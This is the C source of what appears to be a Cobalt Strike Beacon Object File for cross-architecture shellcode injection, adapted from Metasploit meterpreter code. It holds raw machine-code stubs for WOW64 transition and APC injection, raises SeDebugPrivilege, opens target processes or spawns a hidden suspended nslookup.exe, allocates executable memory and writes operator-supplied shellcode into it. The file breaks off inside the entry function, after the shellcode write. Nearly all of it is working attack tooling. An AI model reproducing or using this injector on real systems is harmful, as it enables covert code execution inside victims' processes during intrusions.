#include <windows.h>
#include "../_include/beacon.h"
#include "libc.h"

//THANK YOU https://github.com/OpenWireSec/metasploit/blob/master/external/source/meterpreter/source/common/arch/win/i386/base_inject.c


// Architecture constants - Must be defined before any usage
#define PROCESS_ARCH_UNKNOWN 0
#define PROCESS_ARCH_X86    1
#define PROCESS_ARCH_X64    2

// Function imports
DECLSPEC_IMPORT void* __cdecl MSVCRT$memcpy(void* dest, const void* src, size_t count);
DECLSPEC_IMPORT void* __cdecl MSVCRT$memset(void* dest, int ch, size_t count);
DECLSPEC_IMPORT int __cdecl MSVCRT$strcmp(const char* str1, const char* str2);
DECLSPEC_IMPORT void* __cdecl MSVCRT$malloc(size_t size);
DECLSPEC_IMPORT void __cdecl MSVCRT$free(void* ptr);

// Thread snapshot flags
#define TH32CS_SNAPTHREAD 0x00000004

// Thread entry structure
typedef struct tagTHREADENTRY32 {
    DWORD dwSize;
    DWORD cntUsage;
    DWORD th32ThreadID;
    DWORD th32OwnerProcessID;
    LONG tpBasePri;
    LONG tpDeltaPri;
    DWORD dwFlags;
} THREADENTRY32, *LPTHREADENTRY32;

// Windows API declarations
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess(VOID);
WINBASEAPI VOID WINAPI KERNEL32$GetNativeSystemInfo(LPSYSTEM_INFO lpSystemInfo);
WINBASEAPI BOOL WINAPI KERNEL32$IsWow64Process(HANDLE hProcess, PBOOL Wow64Process);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFreeEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
WINBASEAPI BOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
WINBASEAPI BOOL WINAPI KERNEL32$ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread(HANDLE hThread);
WINBASEAPI DWORD WINAPI KERNEL32$SuspendThread(HANDLE hThread);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
WINBASEAPI BOOL WINAPI KERNEL32$Thread32First(HANDLE hSnapshot, LPTHREADENTRY32 lpte);
WINBASEAPI BOOL WINAPI KERNEL32$Thread32Next(HANDLE hSnapshot, LPTHREADENTRY32 lpte);
WINBASEAPI BOOL WINAPI KERNEL32$GetVersionExA(LPOSVERSIONINFOA lpVersionInformation);
WINBASEAPI HANDLE WINAPI KERNEL32$OpenThread(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI BOOL WINAPI KERNEL32$FreeLibrary(HMODULE hLibModule);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
WINBASEAPI BOOL WINAPI KERNEL32$TerminateProcess(HANDLE hProcess, UINT uExitCode);
WINBASEAPI BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
WINBASEAPI BOOL WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);
WINBASEAPI BOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);

// Simple architecture detection
#ifdef _WIN64
    DWORD dwMeterpreterArch = PROCESS_ARCH_X64;
#else
    DWORD dwMeterpreterArch = PROCESS_ARCH_X86;
#endif

// Forward declarations of helper functions
BOOL IsSystem64Bit();
BOOL IsProcessWow64(HANDLE hProcess);
DWORD GetProcessArchitecture(HANDLE hProcess);
BOOL EnableDebugPrivilege();
DWORD DetectShellcodeArchitecture(LPBYTE shellcode, SIZE_T shellcodeSize);
HANDLE CreateMigrationProcess(DWORD targetArch, PROCESS_INFORMATION* pi);
DWORD inject_via_apcthread(HANDLE hProcess, DWORD dwProcessID, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter);
DWORD inject_via_remotethread_wow64(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE *pThread);
DWORD inject_via_remotethread(HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter);

// WOW64 context structure for x86->x64 injection
typedef struct _WOW64CONTEXT {
    union {
        HANDLE hProcess;
        BYTE padding1[8];
    } h;
    union {
        LPVOID lpStartAddress;
        BYTE padding2[8];
    } s;
    union {
        LPVOID lpParameter;
        BYTE padding3[8];
    } p;
    union {
        HANDLE hThread;
        BYTE padding4[8];
    } t;
} WOW64CONTEXT;

// Function pointer types
typedef BOOL (WINAPI * X64FUNCTION)(DWORD dwParameter);
typedef DWORD (WINAPI * EXECUTEX64)(X64FUNCTION pFunction, DWORD dwParameter);
typedef NTSTATUS (NTAPI * NTQUEUEAPCTHREAD)(HANDLE ThreadHandle, LPVOID ApcRoutine, LPVOID ApcRoutineContext, LPVOID ApcStatusBlock, ULONG ApcReserved);

// APC context structure
typedef struct _APCCONTEXT {
    union {
        LPVOID lpStartAddress;
        BYTE padding1[8];
    } s;
    union {
        LPVOID lpParameter;
        BYTE padding2[8];
    } p;
    BYTE bExecuted;
} APCCONTEXT;

// x86 to x64 transition stub - allows x86 code to call x64 functions
BYTE migrate_executex64[] = "\x55\x89\xE5\x56\x57\x8B\x75\x08\x8B\x4D\x0C\xE8\x00\x00\x00\x00"
                           "\x58\x83\xC0\x25\x83\xEC\x08\x89\xE2\xC7\x42\x04\x33\x00\x00\x00"
                           "\x89\x02\xE8\x09\x00\x00\x00\x83\xC4\x14\x5F\x5E\x5D\xC2\x08\x00"
                           "\x8B\x3C\x24\xFF\x2A\x48\x31\xC0\x57\xFF\xD6\x5F\x50\xC7\x44\x24"
                           "\x04\x23\x00\x00\x00\x89\x3C\x24\xFF\x2C\x24";

// Native x64 code for CreateRemoteThread
BYTE migrate_wownativex[] = "\xFC\x48\x89\xCE\x48\x89\xE7\x48\x83\xE4\xF0\xE8\xC8\x00\x00\x00"
                           "\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48"
                           "\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A"
                           "\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9"
                           "\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C"
                           "\x48\x01\xD0\x66\x81\x78\x18\x0B\x02\x75\x72\x8B\x80\x88\x00\x00"
                           "\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40"
                           "\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6"
                           "\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0"
                           "\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40"
                           "\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0"
                           "\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58"
                           "\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A"
                           "\x48\x8B\x12\xE9\x4F\xFF\xFF\xFF\x5D\x4D\x31\xC9\x41\x51\x48\x8D"
                           "\x46\x18\x50\xFF\x76\x10\xFF\x76\x08\x41\x51\x41\x51\x49\xB8\x01"
                           "\x00\x00\x00\x00\x00\x00\x00\x48\x31\xD2\x48\x8B\x0E\x41\xBA\xC8"
                           "\x38\xA4\x40\xFF\xD5\x48\x85\xC0\x74\x0C\x48\xB8\x00\x00\x00\x00"
                           "\x00\x00\x00\x00\xEB\x0A\x48\xB8\x01\x00\x00\x00\x00\x00\x00\x00"
                           "\x48\x83\xC4\x50\x48\x89\xFC\xC3";

// x86 APC stub
BYTE apc_stub_x86[] = "\xFC\x8B\x74\x24\x04\x55\x89\xE5\xE8\x89\x00\x00\x00\x60\x89\xE5"
                      "\x31\xD2\x64\x8B\x52\x30\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F"
                      "\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF"
                      "\x0D\x01\xC7\xE2\xF0\x52\x57\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B"
                      "\x40\x78\x85\xC0\x74\x4A\x01\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01"
                      "\xD3\xE3\x3C\x49\x8B\x34\x8B\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF"
                      "\x0D\x01\xC7\x38\xE0\x75\xF4\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58"
                      "\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04"
                      "\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58"
                      "\x5F\x5A\x8B\x12\xEB\x86\x5B\x80\x7E\x10\x00\x75\x3B\xC6\x46\x10"
                      "\x01\x68\xA6\x95\xBD\x9D\xFF\xD3\x3C\x06\x7C\x1A\x31\xC9\x64\x8B"
                      "\x41\x18\x39\x88\xA8\x01\x00\x00\x75\x0C\x8D\x93\xCF\x00\x00\x00"
                      "\x89\x90\xA8\x01\x00\x00\x31\xC9\x51\x51\xFF\x76\x08\xFF\x36\x51"
                      "\x51\x68\x38\x68\x0D\x16\xFF\xD3\xC9\xC2\x0C\x00\x00\x00\x00\x00"
                      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                      "\x00\x00\x00\x00";

// x64 APC stub
BYTE apc_stub_x64[] = "\xFC\x80\x79\x10\x00\x0F\x85\x13\x01\x00\x00\xC6\x41\x10\x01\x48"
                      "\x83\xEC\x78\xE8\xC8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48"
                      "\x31\xD2\x65\x48\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52\x20\x48"
                      "\x8B\x72\x50\x48\x0F\xB7\x4A\x4A\x4D\x31\xC9\x48\x31\xC0\xAC\x3C"
                      "\x61\x7C\x02\x2C\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xED\x52\x41"
                      "\x51\x48\x8B\x52\x20\x8B\x42\x3C\x48\x01\xD0\x66\x81\x78\x18\x0B"
                      "\x02\x75\x72\x8B\x80\x88\x00\x00\x00\x48\x85\xC0\x74\x67\x48\x01"
                      "\xD0\x50\x8B\x48\x18\x44\x8B\x40\x20\x49\x01\xD0\xE3\x56\x48\xFF"
                      "\xC9\x41\x8B\x34\x88\x48\x01\xD6\x4D\x31\xC9\x48\x31\xC0\xAC\x41"
                      "\xC1\xC9\x0D\x41\x01\xC1\x38\xE0\x75\xF1\x4C\x03\x4C\x24\x08\x45"
                      "\x39\xD1\x75\xD8\x58\x44\x8B\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C"
                      "\x48\x44\x8B\x40\x1C\x49\x01\xD0\x41\x8B\x04\x88\x48\x01\xD0\x41"
                      "\x58\x41\x58\x5E\x59\x5A\x41\x58\x41\x59\x41\x5A\x48\x83\xEC\x20"
                      "\x41\x52\xFF\xE0\x58\x41\x59\x5A\x48\x8B\x12\xE9\x4F\xFF\xFF\xFF"
                      "\x5D\x48\x31\xD2\x65\x48\x8B\x42\x30\x48\x39\x90\xC8\x02\x00\x00"
                      "\x75\x0E\x48\x8D\x95\x07\x01\x00\x00\x48\x89\x90\xC8\x02\x00\x00"
                      "\x4C\x8B\x01\x4C\x8B\x49\x08\x48\x31\xC9\x48\x31\xD2\x51\x51\x41"
                      "\xBA\x38\x68\x0D\x16\xFF\xD5\x48\x81\xC4\xA8\x00\x00\x00\xC3\x00"
                      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                      "\x00\x00\x00";

// Detect shellcode architecture based on common patterns
DWORD DetectShellcodeArchitecture(LPBYTE shellcode, SIZE_T shellcodeSize) {
    if (shellcodeSize < 10) {
        return PROCESS_ARCH_X86; // Default to x86 for small payloads
    }

    // Check for x64 indicators
    for (int i = 0; i < 50 && i < shellcodeSize - 5; i++) {
        unsigned char b = shellcode[i];

        // REX prefixes (0x40-0x4F) are strong indicators of x64
        if (b >= 0x40 && b <= 0x4F) {
            // Verify it's followed by a valid instruction
            unsigned char next = shellcode[i + 1];
            if ((next >= 0x50 && next <= 0x5F) ||  // push/pop
                (next >= 0x80 && next <= 0x8F) ||  // arithmetic
                (next == 0x89) || (next == 0x8B)) { // mov
                return PROCESS_ARCH_X64;
            }
        }

        // Check for x64-specific patterns
        if (i < shellcodeSize - 10) {
            // Common x64 function prologue
            if (shellcode[i] == 0x48 && shellcode[i+1] == 0x89 &&
                shellcode[i+2] == 0x5C && shellcode[i+3] == 0x24) {
                return PROCESS_ARCH_X64;
            }

            // x64 syscall instruction
            if (shellcode[i] == 0x0F && shellcode[i+1] == 0x05) {
                return PROCESS_ARCH_X64;
            }
        }
    }

    return PROCESS_ARCH_X86; // Default to x86 if no x64 indicators found
}

// Create a suspended process for migration
HANDLE CreateMigrationProcess(DWORD targetArch, PROCESS_INFORMATION* pi) {
    STARTUPINFOA si;
    char cmdLine[MAX_PATH] = {0};
    BOOL result = FALSE;

    MSVCRT$memset(&si, 0, sizeof(si));
    MSVCRT$memset(pi, 0, sizeof(PROCESS_INFORMATION));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    // Determine the appropriate executable path based on architecture
    if (targetArch == PROCESS_ARCH_X64) {
        if (dwMeterpreterArch == PROCESS_ARCH_X86) {
            // Creating x64 process from x86 - use sysnative
            MSVCRT$memcpy(cmdLine, "C:\\Windows\\sysnative\\nslookup.exe", 35);
        } else {
            // Native x64 to x64
            MSVCRT$memcpy(cmdLine, "C:\\Windows\\System32\\nslookup.exe", 34);
        }
    } else {
        // Creating x86 process
        if (IsSystem64Bit()) {
            MSVCRT$memcpy(cmdLine, "C:\\Windows\\SysWOW64\\nslookup.exe", 34);
        } else {
            MSVCRT$memcpy(cmdLine, "C:\\Windows\\System32\\nslookup.exe", 34);
        }
    }

    // Create the process in suspended state
    result = KERNEL32$CreateProcessA(
        NULL,                           // lpApplicationName
        cmdLine,                        // lpCommandLine
        NULL,                           // lpProcessAttributes
        NULL,                           // lpThreadAttributes
        FALSE,                          // bInheritHandles
        CREATE_SUSPENDED | CREATE_NO_WINDOW,  // dwCreationFlags
        NULL,                           // lpEnvironment
        NULL,                           // lpCurrentDirectory
        &si,                           // lpStartupInfo
        pi                             // lpProcessInformation
    );

    if (!result) {
        DWORD error = KERNEL32$GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "CreateProcessA failed with error: %d", error);
        return NULL;
    }

    return pi->hProcess;
}

// Helper functions
BOOL IsSystem64Bit() {
    SYSTEM_INFO si;
    KERNEL32$GetNativeSystemInfo(&si);
    return (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64);
}

BOOL IsProcessWow64(HANDLE hProcess) {
    BOOL isWow64 = FALSE;
    KERNEL32$IsWow64Process(hProcess, &isWow64);
    return isWow64;
}

DWORD GetProcessArchitecture(HANDLE hProcess) {
    if (!IsSystem64Bit()) {
        return PROCESS_ARCH_X86;
    }
    return IsProcessWow64(hProcess) ? PROCESS_ARCH_X86 : PROCESS_ARCH_X64;
}

// Enable debug privilege for process access
BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    LUID sedebugnameValue;
    TOKEN_PRIVILEGES tkp;

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    if (!ADVAPI32$LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &sedebugnameValue)) {
        KERNEL32$CloseHandle(hToken);
        return FALSE;
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = sedebugnameValue;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
        KERNEL32$CloseHandle(hToken);
        return FALSE;
    }

    KERNEL32$CloseHandle(hToken);
    return TRUE;
}

// Inject via APC into multiple threads
DWORD inject_via_apcthread(HANDLE hProcess, DWORD dwProcessID, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter) {
    DWORD dwResult = ERROR_ACCESS_DENIED;
    HMODULE hNtdll = NULL;
    NTQUEUEAPCTHREAD pNtQueueApcThread = NULL;
    HANDLE hThreadSnap = NULL;
    LPVOID lpApcStub = NULL;
    LPVOID lpRemoteApcStub = NULL;
    LPVOID lpRemoteApcContext = NULL;
    THREADENTRY32 t = {0};
    APCCONTEXT ctx = {0};
    DWORD dwApcStubLength = 0;
    int threadCount = 0;

    ctx.s.lpStartAddress = lpStartAddress;
    ctx.p.lpParameter = lpParameter;
    ctx.bExecuted = FALSE;

    // Select appropriate APC stub
    if (dwDestinationArch == PROCESS_ARCH_X86) {
        if (dwMeterpreterArch == PROCESS_ARCH_X64) {
            // x64->x86 APC injection not supported
            BeaconPrintf(CALLBACK_ERROR, "x64 to x86 APC injection not supported");
            return ERROR_NOT_SUPPORTED;
        }
        lpApcStub = apc_stub_x86;
        dwApcStubLength = sizeof(apc_stub_x86);
    } else {
        lpApcStub = apc_stub_x64;
        dwApcStubLength = sizeof(apc_stub_x64);
    }

    hNtdll = KERNEL32$LoadLibraryA("ntdll");
    if (!hNtdll) {
        return ERROR_NOT_FOUND;
    }

    pNtQueueApcThread = (NTQUEUEAPCTHREAD)KERNEL32$GetProcAddress(hNtdll, "NtQueueApcThread");
    if (!pNtQueueApcThread) {
        KERNEL32$FreeLibrary(hNtdll);
        return ERROR_PROC_NOT_FOUND;
    }

    // Allocate memory for APC stub and context
    lpRemoteApcStub = KERNEL32$VirtualAllocEx(hProcess, NULL, dwApcStubLength + sizeof(APCCONTEXT),
                                             MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!lpRemoteApcStub) {
        KERNEL32$FreeLibrary(hNtdll);
        return ERROR_NOT_ENOUGH_MEMORY;
    }

    lpRemoteApcContext = (LPBYTE)lpRemoteApcStub + dwApcStubLength;

    // Write APC stub and context
    if (!KERNEL32$WriteProcessMemory(hProcess, lpRemoteApcStub, lpApcStub, dwApcStubLength, NULL) ||
        !KERNEL32$WriteProcessMemory(hProcess, lpRemoteApcContext, &ctx, sizeof(APCCONTEXT), NULL)) {
        KERNEL32$VirtualFreeEx(hProcess, lpRemoteApcStub, 0, MEM_RELEASE);
        KERNEL32$FreeLibrary(hNtdll);
        return ERROR_WRITE_FAULT;
    }

    // Enumerate threads
    hThreadSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap == INVALID_HANDLE_VALUE) {
        KERNEL32$VirtualFreeEx(hProcess, lpRemoteApcStub, 0, MEM_RELEASE);
        KERNEL32$FreeLibrary(hNtdll);
        return ERROR_ACCESS_DENIED;
    }

    t.dwSize = sizeof(THREADENTRY32);
    if (KERNEL32$Thread32First(hThreadSnap, &t)) {
        do {
            if (t.th32OwnerProcessID == dwProcessID) {
                HANDLE hThread = KERNEL32$OpenThread(THREAD_ALL_ACCESS, FALSE, t.th32ThreadID);
                if (hThread) {
                    if (KERNEL32$SuspendThread(hThread) != (DWORD)-1) {
                        if (pNtQueueApcThread(hThread, lpRemoteApcStub, lpRemoteApcContext, NULL, 0) == 0) {
                            dwResult = ERROR_SUCCESS;
                            threadCount++;
                            BeaconPrintf(CALLBACK_OUTPUT, "Queued APC to thread %d", t.th32ThreadID);
                        }
                        KERNEL32$ResumeThread(hThread);
                    }
                    KERNEL32$CloseHandle(hThread);
                }
            }
        } while (KERNEL32$Thread32Next(hThreadSnap, &t));
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Queued APC to %d threads", threadCount);

    KERNEL32$CloseHandle(hThreadSnap);
    KERNEL32$FreeLibrary(hNtdll);

    return dwResult;
}

// WOW64 injection - x86 to x64
DWORD inject_via_remotethread_wow64(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE *pThread) {
    DWORD dwResult = ERROR_SUCCESS;
    EXECUTEX64 pExecuteX64 = NULL;
    X64FUNCTION pX64function = NULL;
    WOW64CONTEXT *ctx = NULL;
    OSVERSIONINFOA os = {0};

    os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    if (!KERNEL32$GetVersionExA(&os)) {
        return ERROR_NOT_SUPPORTED;
    }

    // Windows 2003 not supported for this method
    if (os.dwMajorVersion == 5 && os.dwMinorVersion == 2) {
        return ERROR_NOT_SUPPORTED;
    }

    // Allocate executable memory for transition stub
    pExecuteX64 = (EXECUTEX64)KERNEL32$VirtualAlloc(NULL, sizeof(migrate_executex64),
                                                   MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!pExecuteX64) {
        return ERROR_NOT_ENOUGH_MEMORY;
    }

    // Allocate memory for x64 function and context
    pX64function = (X64FUNCTION)KERNEL32$VirtualAlloc(NULL, sizeof(migrate_wownativex) + sizeof(WOW64CONTEXT),
                                                     MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!pX64function) {
        KERNEL32$VirtualFree(pExecuteX64, 0, MEM_RELEASE);
        return ERROR_NOT_ENOUGH_MEMORY;
    }

    // Copy stubs
    MSVCRT$memcpy(pExecuteX64, migrate_executex64, sizeof(migrate_executex64));
    MSVCRT$memcpy(pX64function, migrate_wownativex, sizeof(migrate_wownativex));

    // Setup context
    ctx = (WOW64CONTEXT*)((LPBYTE)pX64function + sizeof(migrate_wownativex));
    ctx->h.hProcess = hProcess;
    ctx->s.lpStartAddress = lpStartAddress;
    ctx->p.lpParameter = lpParameter;
    ctx->t.hThread = NULL;

    BeaconPrintf(CALLBACK_OUTPUT, "Executing WOW64 transition for thread creation");

    // Execute x64 code from x86 process
    if (!pExecuteX64(pX64function, (DWORD)ctx)) {
        dwResult = ERROR_ACCESS_DENIED;
    } else if (!ctx->t.hThread) {
        dwResult = ERROR_INVALID_HANDLE;
    } else {
        *pThread = ctx->t.hThread;
        BeaconPrintf(CALLBACK_OUTPUT, "WOW64 thread created successfully");
    }

    KERNEL32$VirtualFree(pExecuteX64, 0, MEM_RELEASE);
    KERNEL32$VirtualFree(pX64function, 0, MEM_RELEASE);

    return dwResult;
}

// Standard remote thread injection with WOW64 fallback
DWORD inject_via_remotethread(HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter) {
    DWORD dwResult = ERROR_SUCCESS;
    HANDLE hThread = NULL;
    DWORD dwThreadId = 0;

    // Try standard CreateRemoteThread
    hThread = KERNEL32$CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress,
                                         lpParameter, CREATE_SUSPENDED, &dwThreadId);

    if (!hThread) {
        // If x86->x64, try WOW64 method
        if (dwMeterpreterArch == PROCESS_ARCH_X86 && dwDestinationArch == PROCESS_ARCH_X64) {
            BeaconPrintf(CALLBACK_OUTPUT, "CreateRemoteThread failed, attempting WOW64 injection");

            dwResult = inject_via_remotethread_wow64(hProcess, lpStartAddress, lpParameter, &hThread);
            if (dwResult != ERROR_SUCCESS || !hThread) {
                return dwResult;
            }
        } else {
            return KERNEL32$GetLastError();
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Thread created, resuming execution");

    if (KERNEL32$ResumeThread(hThread) == (DWORD)-1) {
        dwResult = KERNEL32$GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "ResumeThread failed");
    }

    KERNEL32$CloseHandle(hThread);
    return dwResult;
}

// Main BOF entry point
void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    DWORD dwPid = BeaconDataInt(&parser);
    SIZE_T shellcodeSize = 0;
    LPBYTE shellcode = BeaconDataExtract(&parser, &shellcodeSize);

    HANDLE hProcess = NULL;
    LPVOID lpRemoteShellcode = NULL;
    DWORD dwDestinationArch = PROCESS_ARCH_UNKNOWN;
    DWORD dwShellcodeArch = PROCESS_ARCH_UNKNOWN;
    DWORD dwResult = ERROR_SUCCESS;
    PROCESS_INFORMATION pi = {0};
    BOOL bCreatedProcess = FALSE;

    BeaconPrintf(CALLBACK_OUTPUT, "Cross-Architecture Injection with WOW64 Support");
    BeaconPrintf(CALLBACK_OUTPUT, "Target PID: %d, Shellcode size: %d bytes", dwPid, shellcodeSize);
    BeaconPrintf(CALLBACK_OUTPUT, "Current process architecture: %s",
                 dwMeterpreterArch == PROCESS_ARCH_X64 ? "x64" : "x86");

    // Enable debug privilege
    if (!EnableDebugPrivilege()) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to enable debug privilege, continuing anyway");
    }

    // Handle PID 0 - create new process
    if (dwPid == 0) {
        // Detect shellcode architecture
        dwShellcodeArch = DetectShellcodeArchitecture(shellcode, shellcodeSize);
        BeaconPrintf(CALLBACK_OUTPUT, "PID 0 specified - creating new %s process for migration",
                     dwShellcodeArch == PROCESS_ARCH_X64 ? "x64" : "x86");

        // Create suspended process matching shellcode architecture
        hProcess = CreateMigrationProcess(dwShellcodeArch, &pi);
        if (!hProcess) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to create migration process");
            return;
        }

        dwPid = pi.dwProcessId;
        bCreatedProcess = TRUE;
        dwDestinationArch = dwShellcodeArch;

        BeaconPrintf(CALLBACK_OUTPUT, "Created suspended process - PID: %d, TID: %d",
                     pi.dwProcessId, pi.dwThreadId);
    } else {
        // Open existing process
        hProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
        if (!hProcess) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to open process %d", dwPid);
            return;
        }

        // Determine target architecture
        dwDestinationArch = GetProcessArchitecture(hProcess);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Target process architecture: %s",
                 dwDestinationArch == PROCESS_ARCH_X64 ? "x64" : "x86");

    // Allocate memory in target process
    lpRemoteShellcode = KERNEL32$VirtualAllocEx(hProcess, NULL, shellcodeSize,
                                               MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!lpRemoteShellcode) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate memory in target process");
        if (bCreatedProcess) {
            KERNEL32$TerminateProcess(hProcess, 1);
            KERNEL32$CloseHandle(pi.hThread);
        }
        KERNEL32$CloseHandle(hProcess);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Allocated %d bytes at 0x%p in target process",
                 shellcodeSize, lpRemoteShellcode);

    // Write shellcode
    SIZE_T written = 0;
    if (!KERNEL32$WriteProcessMemory(hProcess, lpRemoteShellcode, shellcode, shellcodeSize, &written)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to write shellcode to target process");
        KERNEL32$VirtualFreeEx(hProcess, lpRemoteShellcode, 0, MEM_RELEASE);
        if (bCreatedProcess) {
            KERNEL32$TerminateProcess(hProcess, 1);
            KERNEL32$CloseHandle(pi.hThread);
        }
        KERNEL32$CloseHandle(hProcess);
        return;
    }

